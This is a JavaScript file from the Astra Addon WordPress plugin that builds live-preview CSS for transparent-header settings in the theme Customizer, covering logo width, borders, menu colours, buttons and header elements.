/**
 * This file adds some LIVE to the Customizer live preview. To leverage
 * this, set your custom settings to 'postMessage' and then add your handling
 * here. Your javascript should grab settings from customizer controls, and
 * then make any necessary changes to the page using jQuery.
 *
 * @package Astra Addon
 * @since  1.0.0
 */

 ( function( $ ) {

	var isAstraHFBuilderActive    = AstraBuilderTransparentData.is_astra_hf_builder_active || false;

	/**
	 * Transparent Logo Width
	 */
	wp.customize( 'astra-settings[transparent-header-logo-width]', function( setting ) {
		setting.bind( function( logo_width ) {
			if ( logo_width['desktop'] != '' || logo_width['tablet'] != '' || logo_width['mobile'] != '' ) {
				var dynamicStyle = '.ast-theme-transparent-header #masthead .site-logo-img .transparent-custom-logo img {max-width: ' + logo_width['desktop'] + 'px;} .ast-theme-transparent-header #masthead .site-logo-img .transparent-custom-logo .astra-logo-svg { width: ' + logo_width['desktop'] + 'px;} @media( max-width: 768px ) { .ast-theme-transparent-header #masthead .site-logo-img .transparent-custom-logo img {max-width: ' + logo_width['tablet'] + 'px;} .ast-theme-transparent-header #masthead .site-logo-img .transparent-custom-logo .astra-logo-svg { width: ' + logo_width['tablet'] + 'px;} } @media( max-width: 544px ) { .ast-theme-transparent-header #masthead .site-logo-img .transparent-custom-logo img {max-width: ' + logo_width['mobile'] + 'px;} .ast-theme-transparent-header #masthead .site-logo-img .transparent-custom-logo .astra-logo-svg { width: ' + logo_width['mobile'] + 'px;} }';
				astra_add_dynamic_css( 'transparent-header-logo-width', dynamicStyle );
			}
			else{
				wp.customize.preview.send( 'refresh' );
			}
		} );
	} );

	/**
	 * Transparent Header Bottom Border width
	 */
	wp.customize( 'astra-settings[transparent-header-main-sep]', function( value ) {
		value.bind( function( border ) {

			if( isAstraHFBuilderActive ) {

				var selector = '';
				var displayOn = (typeof ( wp.customize._value['astra-settings[transparent-header-on-devices]'] ) != 'undefined') ? wp.customize._value['astra-settings[transparent-header-on-devices]']._value : 'both';

				switch( displayOn ) {
					case 'both':
						selector = '.ast-theme-transparent-header #ast-desktop-header > [CLASS*="-header-wrap"]:nth-last-child(2) > [CLASS*="-header-bar"], .ast-theme-transparent-header.ast-header-break-point #ast-mobile-header > [CLASS*="-header-wrap"]:nth-last-child(2) > [CLASS*="-header-bar"]';
					break;
					case 'desktop':
						selector = '.ast-theme-transparent-header #ast-desktop-header > [CLASS*="-header-wrap"]:nth-last-child(2) > [CLASS*="-header-bar"]';
					break;
					case 'mobile':
						selector = '.ast-theme-transparent-header.ast-header-break-point #ast-mobile-header > [CLASS*="-header-wrap"]:nth-last-child(2) > [CLASS*="-header-bar"]';
					break;
				}

				var dynamicStyle = selector + '{';
				dynamicStyle += 'border-bottom-width: ' + border + 'px';
				dynamicStyle += '}';

				astra_add_dynamic_css( 'transparent-header-main-sep', dynamicStyle );

			} else {

				var dynamicStyle = ' body.ast-theme-transparent-header.ast-header-break-point .main-header-bar { border-bottom-width: ' + border + 'px } ';

				dynamicStyle += 'body.ast-theme-transparent-header.ast-desktop .main-header-bar {';
				dynamicStyle += 'border-bottom-width: ' + border + 'px';
				dynamicStyle += '}';

				astra_add_dynamic_css( 'transparent-header-main-sep', dynamicStyle );
			}
		} );
	} );

	/**
	 * Transparent Header Bottom Border color
	 */
	wp.customize( 'astra-settings[transparent-header-main-sep-color]', function( value ) {
		value.bind( function( color ) {
			if (color == '') {
				wp.customize.preview.send( 'refresh' );
			}

			if( isAstraHFBuilderActive ) {

				var selector = '';
				var displayOn = (typeof ( wp.customize._value['astra-settings[transparent-header-on-devices]'] ) != 'undefined') ? wp.customize._value['astra-settings[transparent-header-on-devices]']._value : 'both';

				switch( displayOn ) {
					case 'both':
						selector = '.ast-theme-transparent-header #ast-desktop-header > [CLASS*="-header-wrap"]:nth-last-child(2) > [CLASS*="-header-bar"], .ast-theme-transparent-header.ast-header-break-point #ast-mobile-header > [CLASS*="-header-wrap"]:nth-last-child(2) > [CLASS*="-header-bar"]';
					break;
					case 'desktop':
						selector = '.ast-theme-transparent-header #ast-desktop-header > [CLASS*="-header-wrap"]:nth-last-child(2) > [CLASS*="-header-bar"]';
					break;
					case 'mobile':
						selector = '.ast-theme-transparent-header.ast-header-break-point #ast-mobile-header > [CLASS*="-header-wrap"]:nth-last-child(2) > [CLASS*="-header-bar"]';
					break;
				}

				var dynamicStyle = selector + '{';
				dynamicStyle += 'border-bottom-color: ' + color;
				dynamicStyle += '}';

				astra_add_dynamic_css( 'transparent-header-main-sep-color', dynamicStyle );
			} else {

				var dynamicStyle = ' body.ast-theme-transparent-header.ast-desktop .main-header-bar { border-bottom-color: ' + color + '; } ';
					dynamicStyle += ' body.ast-theme-transparent-header.ast-header-break-point .main-header-bar { border-bottom-color: ' + color + '; } ';

				astra_add_dynamic_css( 'transparent-header-main-sep-color', dynamicStyle );
			}

		} );
	} );


	/* Transparent Header Colors */
	astra_color_responsive_css( 'colors-background', 'astra-settings[primary-menu-a-bg-color-responsive]', 	'background-color', 	'.main-header-menu .current-menu-item > .menu-link, .main-header-menu .current-menu-ancestor > .menu-link,.ast-header-sections-navigation .menu-item.current-menu-item > .menu-link,.ast-header-sections-navigation .menu-item.current-menu-ancestor > .menu-link' );

	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-header-bg-color-responsive]', 'background-color', '.ast-theme-transparent-header .main-header-bar, .ast-theme-transparent-header.ast-header-break-point .main-header-bar-wrap .main-header-menu, .ast-theme-transparent-header.ast-header-break-point .main-header-bar-wrap .main-header-bar, .ast-theme-transparent-header.ast-header-break-point .ast-mobile-header-wrap .main-header-bar' );
	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-header-color-site-title-responsive]', 'color', '.ast-theme-transparent-header .site-title a, .ast-theme-transparent-header .site-title a:focus, .ast-theme-transparent-header .site-title a:hover, .ast-theme-transparent-header .site-title a:visited, .ast-theme-transparent-header .site-header .site-description' );
	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-header-color-h-site-title-responsive]', 'color', '.ast-theme-transparent-header .site-header .site-title a:hover' );

	// Primary Menu
	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-menu-bg-color-responsive]', 'background-color', '.ast-theme-transparent-header .ast-builder-menu .main-header-menu, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu, .ast-theme-transparent-header .ast-builder-menu .main-header-menu, .ast-theme-transparent-header.ast-header-break-point .ast-builder-menu .main-header-bar-wrap .main-header-menu, .ast-flyout-menu-enable.ast-header-break-point.ast-theme-transparent-header .main-header-bar-navigation #site-navigation, .ast-fullscreen-menu-enable.ast-header-break-point.ast-theme-transparent-header .main-header-bar-navigation #site-navigation, .ast-flyout-above-menu-enable.ast-header-break-point.ast-theme-transparent-header .ast-above-header-navigation-wrap .ast-above-header-navigation, .ast-flyout-below-menu-enable.ast-header-break-point.ast-theme-transparent-header .ast-below-header-navigation-wrap .ast-below-header-actual-nav, .ast-fullscreen-above-menu-enable.ast-header-break-point.ast-theme-transparent-header .ast-above-header-navigation-wrap, .ast-fullscreen-below-menu-enable.ast-header-break-point.ast-theme-transparent-header .ast-below-header-navigation-wrap, .ast-theme-transparent-header .main-header-menu .menu-link' );

	astra_color_responsive_css( 'transparent-primary-header-menu-colors', 'astra-settings[transparent-menu-color-responsive]', 'color', '.ast-theme-transparent-header .ast-builder-menu .main-header-menu, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-link, .ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .menu-item > .menu-link, .ast-theme-transparent-header .ast-masthead-custom-menu-items, .ast-theme-transparent-header .ast-masthead-custom-menu-items a, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item > .ast-menu-toggle, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item > .ast-menu-toggle, .ast-theme-transparent-header .main-header-menu .menu-link' );

	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-menu-h-color-responsive]', 'color', '.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item:hover > .menu-link, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item:hover > .ast-menu-toggle, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .ast-masthead-custom-menu-items a:hover, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .focus > .menu-link, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .focus > .ast-menu-toggle, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-item > .menu-link, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-ancestor > .menu-link, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-item > .ast-menu-toggle, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-ancestor > .ast-menu-toggle, .ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-item > .menu-link, .ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-ancestor > .menu-link, .ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-item > .ast-menu-toggle, .ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-ancestor > .ast-menu-toggle, .ast-theme-transparent-header .main-header-menu .menu-item:hover > .menu-link, .ast-theme-transparent-header .main-header-menu .current-menu-item > .menu-link, .ast-theme-transparent-header .main-header-menu .current-menu-ancestor > .menu-link' );

	// Primary SubMenu
	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-submenu-bg-color-responsive]', 'background-color', '.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu, .ast-header-break-point.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu, .ast-theme-transparent-header .ast-builder-menu [CLASS*="ast-builder-menu-"] .main-header-menu .sub-menu, .ast-header-break-point.ast-theme-transparent-header .ast-builder-menu [CLASS*="ast-builder-menu-"] .main-header-menu .sub-menu, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-link, .ast-header-break-point.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-link, .ast-theme-transparent-header .ast-builder-menu [CLASS*="ast-builder-menu-"] .main-header-menu .sub-menu .menu-link, .ast-header-break-point.ast-theme-transparent-header .ast-builder-menu [CLASS*="ast-builder-menu-"] .main-header-menu .sub-menu .menu-link, .ast-theme-transparent-header .main-header-menu .menu-item .sub-menu .menu-link, .ast-header-break-point.ast-theme-transparent-header .main-header-menu .menu-item .sub-menu .menu-link, .ast-theme-transparent-header .main-header-menu .menu-item .sub-menu, .ast-header-break-point.ast-theme-transparent-header .main-header-menu .menu-item .sub-menu' );

	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-submenu-color-responsive]', 'color', '.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item .menu-link,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item > .ast-menu-toggle, .astra-hfb-header.ast-theme-transparent-header [CLASS*="ast-builder-menu-"]  .main-header-menu .sub-menu .menu-item .menu-link, .astra-hfb-header.ast-theme-transparent-header [CLASS*="ast-builder-menu-"]  .main-header-menu .sub-menu .menu-item > .ast-menu-toggle, .ast-theme-transparent-header .main-header-menu .menu-item .sub-menu .menu-link, .ast-header-break-point.ast-theme-transparent-header .main-header-menu .menu-item .sub-menu .menu-link' );

	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-submenu-h-color-responsive]', 'color', '.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu a:hover,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item:hover > .menu-item, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item.focus > .menu-item, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item.current-menu-item > .menu-link,	.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item.current-menu-item > .ast-menu-toggle,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item:hover > .ast-menu-toggle, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item.focus > .ast-menu-toggle, .ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item:hover > .menu-link, .ast-theme-transparent-header .main-header-menu .menu-item .sub-menu .menu-item:hover .menu-link' );

	// Primary Content Section text color
	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-content-section-text-color-responsive]', 'color', '.ast-theme-transparent-header div.ast-masthead-custom-menu-items, .ast-theme-transparent-header div.ast-masthead-custom-menu-items .widget, .ast-theme-transparent-header div.ast-masthead-custom-menu-items .widget-title, .ast-theme-transparent-header .site-header-section [CLASS*="ast-header-html-"] .ast-builder-html-element' );
	// Primary Content Section link color
	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-content-section-link-color-responsive]', 'color', '.ast-theme-transparent-header div.ast-masthead-custom-menu-items a, .ast-theme-transparent-header div.ast-masthead-custom-menu-items .widget a, .ast-theme-transparent-header .site-header-section [CLASS*="ast-header-html-"] .ast-builder-html-element a' );
	// Primary Content Section link hover color
	astra_color_responsive_css( 'transparent-primary-header', 'astra-settings[transparent-content-section-link-h-color-responsive]', 'color', '.ast-theme-transparent-header div.ast-masthead-custom-menu-items a:hover, .ast-theme-transparent-header div.ast-masthead-custom-menu-items .widget a:hover, .ast-theme-transparent-header .site-header-section [CLASS*="ast-header-html-"] .ast-builder-html-element a:hover' );



	// Above Header Menu
	astra_color_responsive_css( 'transparent-above-header', 'astra-settings[transparent-header-bg-color-responsive]', 'background-color', '.ast-theme-transparent-header .ast-above-header-wrap .ast-above-header' );

	astra_color_responsive_css( 'transparent-above-header', 'astra-settings[transparent-menu-bg-color-responsive]', 'background-color', '.ast-theme-transparent-header .ast-above-header-menu, .ast-theme-transparent-header.ast-header-break-point .ast-above-header-section-separated .ast-above-header-navigation ul, .ast-flyout-above-menu-enable.ast-header-break-point.ast-theme-transparent-header .ast-above-header-navigation-wrap .ast-above-header-navigation, .ast-fullscreen-above-menu-enable.ast-header-break-point.ast-theme-transparent-header .ast-above-header-section-separated .ast-above-header-navigation-wrap' );
	astra_color_responsive_css( 'transparent-above-header', 'astra-settings[transparent-menu-color-responsive]', 'color', '.ast-theme-transparent-header .ast-above-header-navigation a, .ast-header-break-point.ast-theme-transparent-header .ast-above-header-navigation a, .ast-header-break-point.ast-theme-transparent-header .ast-above-header-navigation > ul.ast-above-header-menu > .menu-item-has-children:not(.current-menu-item) > .ast-menu-toggle' );
	astra_color_responsive_css( 'transparent-above-header', 'astra-settings[transparent-menu-h-color-responsive]', 'color', '.ast-theme-transparent-header .ast-above-header-navigation .menu-item.current-menu-item > .menu-link,.ast-theme-transparent-header .ast-above-header-navigation .menu-item.current-menu-ancestor > .menu-link, .ast-theme-transparent-header .ast-above-header-navigation .menu-item:hover > .menu-link' )
	// Above Header SubMenu
	astra_color_responsive_css( 'transparent-above-header', 'astra-settings[transparent-submenu-bg-color-responsive]', 'background-color', '.ast-theme-transparent-header .ast-above-header-menu .sub-menu' );
	astra_color_responsive_css( 'transparent-above-header', 'astra-settings[transparent-submenu-color-responsive]', 'color', '.ast-theme-transparent-header .ast-above-header-menu .sub-menu, .ast-theme-transparent-header .ast-above-header-navigation .ast-above-header-menu .sub-menu a' );
	astra_color_responsive_css( 'transparent-above-header', 'astra-settings[transparent-submenu-h-color-responsive]', 'color', '.ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item:hover > .menu-item, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item:focus > .menu-item, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.focus > .menu-item,.ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item:hover > .ast-menu-toggle, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item:focus > .ast-menu-toggle, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.focus > .ast-menu-toggle,.ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-ancestor > .ast-menu-toggle, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-item > .ast-menu-toggle, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-ancestor:hover > .ast-menu-toggle, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-ancestor:focus > .ast-menu-toggle, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-ancestor.focus > .ast-menu-toggle, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-item:hover > .ast-menu-toggle, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-item:focus > .ast-menu-toggle, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-item.focus > .ast-menu-toggle,.ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-ancestor > .menu-link, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-item > .menu-link, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-ancestor:hover > .menu-link, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-ancestor:focus > .menu-link, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-ancestor.focus > .menu-link, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-item:hover > .menu-link, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-item:focus > .menu-link, .ast-theme-transparent-header .ast-above-header-menu .sub-menu .menu-item.current-menu-item.focus > .menu-link' );

	// Above Header Content Section text color
	astra_color_responsive_css( 'transparent-above-header', 'astra-settings[transparent-content-section-text-color-responsive]', 'color', '.ast-theme-transparent-header .ast-above-header-section .user-select, .ast-theme-transparent-header .ast-above-header-section .widget, .ast-theme-transparent-header .ast-above-header-section .widget-title' );
	// Above Header Content Section link color
	astra_color_responsive_css( 'transparent-above-header', 'astra-settings[transparent-content-section-link-color-responsive]', 'color', '.ast-theme-transparent-header .ast-above-header-section .user-select a, .ast-theme-transparent-header .ast-above-header-section .widget a' );
	// Above Header Content Section link hover color
	astra_color_responsive_css( 'transparent-above-header', 'astra-settings[transparent-content-section-link-h-color-responsive]', 'color', '.ast-theme-transparent-header .ast-above-header-section .user-select a:hover, .ast-theme-transparent-header .ast-above-header-section .widget a:hover' );

	// below Header Menu
	astra_color_responsive_css( 'transparent-below-header', 'astra-settings[transparent-header-bg-color-responsive]', 'background-color', '.ast-theme-transparent-header .ast-below-header-wrap .ast-below-header' );

	astra_color_responsive_css( 'transparent-below-header', 'astra-settings[transparent-menu-bg-color-responsive]', 'background-color', '.ast-theme-transparent-header.ast-no-toggle-below-menu-enable.ast-header-break-point .ast-below-header-navigation-wrap, .ast-theme-transparent-header .ast-below-header-actual-nav, .ast-theme-transparent-header.ast-header-break-point .ast-below-header-actual-nav, .ast-flyout-below-menu-enable.ast-header-break-point.ast-theme-transparent-header .ast-below-header-navigation-wrap .ast-below-header-actual-nav, .ast-fullscreen-below-menu-enable.ast-header-break-point.ast-theme-transparent-header .ast-below-header-section-separated .ast-below-header-navigation-wrap' );
	astra_color_responsive_css( 'transparent-below-header', 'astra-settings[transparent-menu-color-responsive]', 'color', '.ast-theme-transparent-header .ast-below-header-menu, .ast-theme-transparent-header .ast-below-header-menu a, .ast-header-break-point.ast-theme-transparent-header .ast-below-header-menu a, .ast-header-break-point.ast-theme-transparent-header .ast-below-header-menu' );
	astra_color_responsive_css( 'transparent-below-header', 'astra-settings[transparent-menu-h-color-responsive]', 'color', '.ast-theme-transparent-header .ast-below-header-menu .menu-item:hover > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .menu-item:focus > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .menu-item.focus > .menu-link,.ast-theme-transparent-header .ast-below-header-menu .menu-item.current-menu-ancestor > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .menu-item.current-menu-item > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .menu-item.current-menu-ancestor > .ast-menu-toggle, .ast-theme-transparent-header .ast-below-header-menu .menu-item.current-menu-item > .ast-menu-toggle, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-ancestor:hover > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-ancestor:focus > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-ancestor.focus > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-item:hover > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-item:focus > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-item.focus > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-ancestor:hover > .ast-menu-toggle, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-ancestor:focus > .ast-menu-toggle, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-ancestor.focus > .ast-menu-toggle, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-item:hover > .ast-menu-toggle, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-item:focus > .ast-menu-toggle, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-item.focus > .ast-menu-toggle' );
	// below Header SubMenu
	astra_color_responsive_css( 'transparent-below-header', 'astra-settings[transparent-submenu-bg-color-responsive]', 'background-color', '.ast-theme-transparent-header .ast-below-header-menu .sub-menu' );
	astra_color_responsive_css( 'transparent-below-header', 'astra-settings[transparent-submenu-color-responsive]', 'color', '.ast-theme-transparent-header .ast-below-header-menu .sub-menu, .ast-theme-transparent-header .ast-below-header-menu .sub-menu a' );
	astra_color_responsive_css( 'transparent-below-header', 'astra-settings[transparent-submenu-h-color-responsive]', 'color', '.ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item:hover > .menu-item, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item:focus > .menu-item, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.focus > .menu-item,.ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-ancestor > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-item > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-ancestor:hover > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-ancestor:focus > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-ancestor.focus > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-item:hover > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-item:focus > .menu-link, .ast-theme-transparent-header .ast-below-header-menu .sub-menu .menu-item.current-menu-item.focus > .menu-link' );

	// below Header Content Section text color
	astra_color_responsive_css( 'transparent-below-header', 'astra-settings[transparent-content-section-text-color-responsive]', 'color', '', '.ast-theme-transparent-header .below-header-user-select, .ast-theme-transparent-header .below-header-user-select .widget,.ast-theme-transparent-header .below-header-user-select .widget-title' );
	// below Header Content Section link color
	astra_color_responsive_css( 'transparent-below-header', 'astra-settings[transparent-content-section-link-color-responsive]', 'color', '', '.ast-theme-transparent-header .below-header-user-select a, .ast-theme-transparent-header .below-header-user-select .widget a' );
	// below Header Content Section link hover color
	astra_color_responsive_css( 'below-transparent-header', 'astra-settings[transparent-content-section-link-h-color-responsive]', 'color', '.ast-theme-transparent-header .below-header-user-select a:hover, .ast-theme-transparent-header .below-header-user-select .widget a:hover' );

	/**
	 * Button border
	 */
	wp.customize( 'astra-settings[primary-header-button-border-group]', function( value ) {
		value.bind( function( value ) {

			var optionValue = JSON.parse(value);
			var border =  optionValue['header-main-rt-section-button-border-size'];

			if( '' != border.top || '' != border.right || '' != border.bottom || '' != border.left ) {
				var dynamicStyle = '.main-header-bar .ast-container .button-custom-menu-item .ast-custom-button-link .ast-custom-button';
					dynamicStyle += '{';
					dynamicStyle += 'border-top-width:'  + border.top + 'px;';
					dynamicStyle += 'border-right-width:'  + border.right + 'px;';
					dynamicStyle += 'border-left-width:'   + border.left + 'px;';
					dynamicStyle += 'border-bottom-width:'   + border.bottom + 'px;';
					dynamicStyle += 'border-style: solid;';
					dynamicStyle += '}';

				astra_add_dynamic_css( 'header-main-rt-section-button-border-size', dynamicStyle );
			}

		} );
	} );

	astra_css( 'astra-settings[header-main-rt-trans-section-button-text-color]', 'color', '.ast-theme-transparent-header .main-header-bar .button-custom-menu-item .ast-custom-button-link .ast-custom-button' );
	astra_css( 'astra-settings[header-main-rt-trans-section-button-back-color]', 'background-color', '.ast-theme-transparent-header .main-header-bar .button-custom-menu-item .ast-custom-button-link .ast-custom-button' );
	astra_css( 'astra-settings[header-main-rt-trans-section-button-text-h-color]', 'color', '.ast-theme-transparent-header .main-header-bar .button-custom-menu-item .ast-custom-button-link .ast-custom-button:hover' );
	astra_css( 'astra-settings[header-main-rt-trans-section-button-back-h-color]', 'background-color', '.ast-theme-transparent-header .main-header-bar .button-custom-menu-item .ast-custom-button-link .ast-custom-button:hover' );
	astra_css( 'astra-settings[header-main-rt-trans-section-button-border-radius]', 'border-radius', '.ast-theme-transparent-header .main-header-bar .button-custom-menu-item .ast-custom-button-link .ast-custom-button', 'px' );
	astra_css( 'astra-settings[header-main-rt-trans-section-button-border-color]', 'border-color', '.ast-theme-transparent-header .main-header-bar .button-custom-menu-item .ast-custom-button-link .ast-custom-button' );
	astra_css( 'astra-settings[header-main-rt-trans-section-button-border-h-color]', 'border-color', '.ast-theme-transparent-header .main-header-bar .button-custom-menu-item .ast-custom-button-link .ast-custom-button:hover' );
	astra_responsive_spacing( 'astra-settings[header-main-rt-trans-section-button-padding]','.ast-theme-transparent-header .main-header-bar .button-custom-menu-item .ast-custom-button-link .ast-custom-button', 'padding', ['top', 'right', 'bottom', 'left' ] );

	/**
	 * Transparent Header > Elements preview styles.
	 */
	astra_css( 'astra-settings[transparent-header-divider-color]', 'border-color', '.ast-theme-transparent-header .ast-header-divider-element .ast-divider-wrapper' );
	astra_css( 'astra-settings[transparent-header-html-text-color]', 'color', '.ast-theme-transparent-header [CLASS*="ast-header-html-"] .ast-builder-html-element' );
	astra_css( 'astra-settings[transparent-header-html-link-color]', 'color', '.ast-theme-transparent-header [CLASS*="ast-header-html-"] .ast-builder-html-element a' );
	astra_css( 'astra-settings[transparent-header-html-link-h-color]', 'color', '.ast-theme-transparent-header [CLASS*="ast-header-html-"] .ast-builder-html-element a:hover' );
	astra_css( 'astra-settings[transparent-header-search-icon-color]', 'color', '.ast-theme-transparent-header .ast-header-search .astra-search-icon, .ast-theme-transparent-header .ast-header-search .search-field::placeholder' );
	astra_css( 'astra-settings[transparent-header-search-box-placeholder-color]', 'color', '.ast-theme-transparent-header .ast-header-search .ast-search-menu-icon .search-field, .ast-theme-transparent-header .ast-header-search .ast-search-menu-icon .search-field::placeholder' );
	astra_css( 'astra-settings[transparent-header-search-box-background-color]', 'background-color', '.ast-theme-transparent-header .ast-header-search .ast-search-menu-icon .search-field, .ast-theme-transparent-header .ast-header-search .ast-search-menu-icon .search-form, .ast-theme-transparent-header .ast-header-search .ast-search-menu-icon .search-submit' );
	astra_color_responsive_css( 'transparent-header-social-color', 'astra-settings[transparent-header-social-icons-bg-color]', 'background', '.ast-theme-transparent-header .ast-header-social-wrap .ast-social-color-type-custom .ast-builder-social-element' );
	astra_color_responsive_css( 'transparent-header-social-color', 'astra-settings[transparent-header-social-icons-color]', 'fill', '.ast-theme-transparent-header .ast-header-social-wrap .ast-social-color-type-custom .ast-builder-social-element svg' );
	astra_color_responsive_css( 'transparent-header-social-color-label', 'astra-settings[transparent-header-social-icons-color]', 'color', '.ast-theme-transparent-header .ast-header-social-wrap .ast-social-color-type-custom .ast-builder-social-element .social-item-label' );
	astra_color_responsive_css( 'transparent-header-social-color', 'astra-settings[transparent-header-social-icons-bg-h-color]', 'background', '.ast-theme-transparent-header .ast-header-social-wrap .ast-social-color-type-custom .ast-builder-social-element:hover' );
	astra_color_responsive_css( 'transparent-header-social-color', 'astra-settings[transparent-header-social-icons-h-color]', 'fill', '.ast-theme-transparent-header .ast-header-social-wrap .ast-social-color-type-custom .ast-builder-social-element:hover svg' );
	astra_color_responsive_css( 'transparent-header-social-color-label-h', 'astra-settings[transparent-header-social-icons-h-color]', 'color', '.ast-theme-transparent-header .ast-header-social-wrap .ast-social-color-type-custom .ast-builder-social-element:hover .social-item-label' );
	astra_css( 'astra-settings[transparent-header-widget-title-color]', 'color', '.ast-theme-transparent-header .widget-area.header-widget-area .widget-title' );

	if( AstraBuilderTransparentData.is_flex_based_css ) {
		var transparent_header_widget = '.ast-theme-transparent-header .widget-area.header-widget-area.header-widget-area-inner';
	}else{
		var transparent_header_widget = '.ast-theme-transparent-header .widget-area.header-widget-area. header-widget-area-inner';
	}
	astra_css( 'astra-settings[transparent-header-widget-content-color]', 'color', transparent_header_widget );
	astra_css( 'astra-settings[transparent-header-widget-link-color]', 'color', transparent_header_widget + ' a' );
	astra_css( 'astra-settings[transparent-header-widget-link-h-color]', 'color', transparent_header_widget + ' a:hover' );

